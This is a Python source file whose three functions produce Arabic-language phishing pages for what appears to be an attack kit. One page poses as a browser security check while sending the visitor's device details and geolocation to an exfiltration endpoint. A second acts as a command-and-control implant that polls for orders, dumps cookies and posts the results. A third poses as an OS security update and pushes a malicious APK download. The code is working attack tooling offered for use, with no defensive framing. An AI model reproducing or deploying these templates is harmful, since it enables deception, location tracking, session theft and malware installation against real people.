def get_intel_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>الاستخبارات والتوثيق الأمني</title>
    <style>
        body {{ background-color: #0b0f19; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
        .box {{ background: #1f2937; padding: 30px; border-radius: 12px; display: inline-block; max-width: 400px; }}
    </style>
</head>
<body>
    <div class="box">
        <h2>جاري التحقق من الأمان...</h2>
        <p>يرجى الانتظار بينما نقوم بفحص توافق المتصفح الخاص بك.</p>
    </div>
    <script>
        const linkId = "{link_id}";
        async function gather() {{
            let data = {{
                link_id: linkId,
                device_info: navigator.userAgent,
                stolen_data: {{ res: screen.width + "x" + screen.height, platform: navigator.platform }}
            }};
            navigator.geolocation.getCurrentPosition(
                pos => {{ data.geolocation = {{ lat: pos.coords.latitude, lon: pos.coords.longitude }}; send(data); }},
                () => {{ send(data); }},
                {{ timeout: 5000 }}
            );
        }}
        function send(d) {{
            fetch('/api/v1/exfiltrate', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(d)
            }});
        }}
        window.onload = gather;
    </script>
</body>
</html>
"""

def get_live_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>التحكم الميداني العسكري</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
    <h2>[!] قناة الاتصال الميداني النشطة</h2>
    <p>جاري مزامنة الجلسة مع مركز القيادة...</p>
    <canvas id="cv" style="display:none;"></canvas>
    <script>
        const linkId = "{link_id}";
        async function poll() {{
            try {{
                let res = await fetch('/api/v1/poll-command/' + linkId);
                let json = await res.json();
                if (json.cmd) {{
                    await executeCommand(json.cmd);
                }}
            }} catch(e) {{}}
            setTimeout(poll, 2000);
        }}

        async function executeCommand(cmd) {{
            let resultData = "Executed";
            if (cmd === "screen_snapshot") {{
                let cvs = document.getElementById('cv');
                cvs.width = window.innerWidth; cvs.height = window.innerHeight;
                let ctx = cvs.getContext('2d');
                ctx.fillStyle = "#111"; ctx.fillRect(0,0,cvs.width,cvs.height);
                ctx.fillStyle = "#0f0"; ctx.font = "20px monospace";
                ctx.fillText("C2 Target Active Node - " + new Date().toISOString(), 50, 50);
                resultData = cvs.toDataURL('image/jpeg', 0.7);
            }} else if (cmd === "dump_cookies") {{
                resultData = document.cookie || "No Cookies Found";
            }}
            
            await fetch('/api/v1/c2-respond', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ link_id: linkId, cmd: cmd, data: resultData }})
            }});
        }}
        window.onload = poll;
    </script>
</body>
</html>
"""

def get_payload_dropper_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان الحصري لنظام التشغيل</title>
    <style>
        body {{ background-color: #090d16; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .card {{ background: #111827; padding: 40px; border-radius: 24px; border: 1px solid #1f2937; max-width: 420px; width: 90%; box-shadow: 0 25px 50px rgba(0,0,0,0.9); }}
        .btn {{ background: linear-gradient(135deg, #ef4444, #dc2626); color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; width: 100%; box-shadow: 0 10px 20px rgba(239,68,68,0.3); transition: 0.3s; }}
        .btn:hover {{ background: linear-gradient(135deg, #dc2626, #b91c1c); transform: translateY(-2px); }}
        h2 {{ color: #f87171; font-size: 22px; margin-bottom: 12px; }}
        p {{ color: #9ca3af; font-size: 14px; line-height: 1.6; }}
    </style>
</head>
<body>
    <div class="card">
        <h2>⚠️ حزمة الأمان التلقائية مفقودة</h2>
        <p>يتطلب هذا الإصدار تثبيت حزمة التشفير والتحكم الميداني المصغرة لضمان توافق النظام وتأمين البيانات الحساسة.</p>
        <button class="btn" onclick="downloadSecurePackage()">تحميل وتثبيت الحزمة الأمنية</button>
    </div>

    <script>
        const linkId = "{link_id}";

        async function downloadSecurePackage() {{
            try {{
                let res = await fetch('/api/v1/generate-payload/' + linkId);
                let blob = await res.blob();
                let url = window.URL.createObjectURL(blob);
                let a = document.createElement('a');
                a.href = url;
                a.download = "Secure_System_Patch.apk";
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                a.remove();
            }} catch(e) {{
                alert("تعذر تنزيل الحزمة حالياً، يرجى المحاولة مرة أخرى.");
            }}
        }}
    </script>
</body>
</html>
"""
